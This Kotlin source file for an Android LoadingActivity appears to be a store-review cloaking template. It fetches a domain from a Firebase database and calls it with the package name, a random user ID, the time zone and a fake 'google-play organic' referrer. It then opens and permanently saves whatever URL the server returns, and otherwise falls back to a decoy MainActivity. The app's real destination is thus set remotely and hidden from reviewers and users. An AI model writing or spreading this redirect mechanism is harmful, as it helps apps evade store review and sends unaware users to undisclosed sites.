package com.template

import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.webkit.WebView
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.google.firebase.FirebaseApp
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.messaging.FirebaseMessaging
import com.template.R
import com.template.databinding.ActivityLoadingBinding
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okio.IOException
import java.time.ZoneId
import java.util.Calendar
import java.util.UUID

class LoadingActivity : AppCompatActivity() {
    lateinit var mFirebaseAnalytics: FirebaseAnalytics
    private lateinit var binding: ActivityLoadingBinding
    private lateinit var preferences: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadingBinding.inflate(layoutInflater)
        setContentView(binding.root)

//        binding.btnTest.setOnClickListener{
////            openChromeCustomTab("https://www.example.com")
//
//            val url = "https://3025.play.gamezop.com/"; //BE SURE TO INSERT YOUR GAMEZOP PROPERTY ID INSTEAD OF 3025 HERE
//            val customTabsIntent: CustomTabsIntent  = CustomTabsIntent.Builder().build();
//            customTabsIntent.launchUrl(this, Uri.parse(url));
//        }

        preferences = getSharedPreferences("my", MODE_PRIVATE)
        val url = preferences.getString("url", "") ?: "bad"

        if(url == "bad") {
            startActivity(Intent(this, MainActivity::class.java))
            return
        }

        val alreadyRunWithInternet = preferences.getBoolean("alreadyRunWithInternet", false)
        val saved = url.isNotEmpty()

        if (!isInternetAvailable(this)) {
            startActivity(Intent(this, MainActivity::class.java))
            return
        }

        if (alreadyRunWithInternet) {
            if (saved) {
                openChromeCustomTab(url)
                return
            } else {
                startActivity(Intent(this, MainActivity::class.java))
                return
            }
        }

        val editor = preferences.edit()
        editor.putBoolean("alreadyRunWithInternet", true)
        editor.apply()

        FirebaseApp.initializeApp(this)
        mFirebaseAnalytics = FirebaseAnalytics.getInstance(this)
        FirebaseMessaging.getInstance().subscribeToTopic("all")
        val database = FirebaseDatabase.getInstance()
        val ref = database.getReference("db")
        ref.addValueEventListener(object : ValueEventListener {
            /**
             * This method will be called with a snapshot of the data at this location. It will also be called
             * each time that data changes.
             *
             * @param snapshot The current data at the location
             */
            override fun onDataChange(snapshot: DataSnapshot) {
                val domenFromFireBase = snapshot.child("link")
                val url = makeLink(domenFromFireBase.value.toString())

                getSite(url)
                Log.d("LoadingActivity", "domenFromFireBase = $url")
            }

            /**
             * This method will be triggered in the event that this listener either failed at the server, or
             * is removed as a result of the security and Firebase Database rules. For more information on
             * securing your data, see: [ Security
 * Quickstart](https://firebase.google.com/docs/database/security/quickstart)
             *
             * @param error A description of the error that occurred
             */
            override fun onCancelled(error: DatabaseError) {
                Log.d("LoadingActivity", "error=$error")
            }

        })
    }

    private fun openChromeCustomTab(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.green))
        builder.addDefaultShareMenuItem()
        val customTabsIntent = builder.build()
        customTabsIntent.launchUrl(this, Uri.parse(url))
    }

    private fun makeLink(domenFromFireBase: String): String {
        val res = "$domenFromFireBase/?" +
                "packageid=" + applicationContext.packageName +
                "&usserid=" + UUID.randomUUID() +
                "&getz=" + Calendar.getInstance().timeZone.id +
                "&getr=utm_source=google-play&utm_medium=organic"
        return res
    }

    private fun getSite(aUrl: String) {
        val client = OkHttpClient()

        val webView = WebView(applicationContext)
        val userAgent = webView.settings.userAgentString

        // Создаем Request с использованием заданного URL-адреса и User Agent
        val request = Request.Builder()
            .url(aUrl)
            .header("User-Agent", userAgent)
            .build()

        // Выполняем запрос
        client.newCall(request).enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                // Обработка ответа
                val responseBody = response.body?.string()
                response.code
                if (responseBody != null) {
                    val editor = this@LoadingActivity.preferences.edit()
                    editor.putString("url", responseBody)
                    editor.apply()
                    openChromeCustomTab(responseBody)
                    finish()
                }
            }

            override fun onFailure(call: Call, e: IOException) {
                // Обработка ошибки
                Log.e("TAG", "Error: ${e.message}", e)
            }
        })
    }
}

fun main() {
    val timeZone = Calendar.getInstance().timeZone
    println(timeZone.displayName)
    println(timeZone.id)
}